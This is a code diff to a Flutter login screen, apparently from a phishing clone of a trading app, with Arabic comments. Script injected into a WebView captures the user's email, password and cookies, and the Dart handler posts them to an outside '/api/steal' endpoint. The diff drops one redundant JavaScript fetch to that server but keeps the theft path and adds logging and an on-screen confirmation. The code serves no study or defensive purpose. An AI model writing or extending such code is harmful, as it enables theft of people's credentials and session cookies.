@@ -50,13 +50,24 @@ class _LoginScreenState extends State<LoginScreen> {
       ..addJavaScriptChannel(
         'QTX_CREDS',
         onMessageReceived: (msg) async {
-          // 337. نستخدم سيرفرك بدل سيرفر صاحبك
-          await http.post(
-            Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
-            headers: {"Content-Type": "application/json"},
-            body: msg.message,
-          );
+          // 341. نستقبل الرسالة من الجافاسكريبت ونبعت للسيرفر
+          print("RECEIVED FROM JS: ${msg.message}");
+          
+          try {
+            await http.post(
+              Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
+              headers: {"Content-Type": "application/json"},
+              body: msg.message,
+            );
+            print("SENT TO SERVER SUCCESS");
+          } catch (e) {
+            print("SERVER ERROR: $e");
+          }
+
           if (mounted) {
+            ScaffoldMessenger.of(context).showSnackBar(
+              SnackBar(content: Text("وصلت البيانات! ${msg.message}"), backgroundColor: Colors.green),
+            );
             Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
           }
         },
@@ -96,12 +107,6 @@ class _LoginScreenState extends State<LoginScreen> {
               QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
               var cookie = document.cookie;
               QTX_CREDS.postMessage(JSON.stringify({type: 'cookies', data: cookie}));
-              // 338. بنبعت للسيرفر مباشرة عشان نضمن وصولها
-              fetch('https://clone-server-dejt.onrender.com/api/steal', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({email: e.value, password: p.value, cookies: cookie})
-              }).catch(err => {});
             }
           } catch (err) {}
         }
@@ -112,7 +117,7 @@ class _LoginScreenState extends State<LoginScreen> {
             var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
             if (t) sendCreds();
           }, true);
-          // 339. الحلقة اللي لقيناها في تطبيق صاحبك (setInterval)
+          // 342. نضيف الحلقة اللي بتعيد المحاولة
           var savedEmail = "";
           var savedPass = "";
           if (savedEmail || savedPass) {
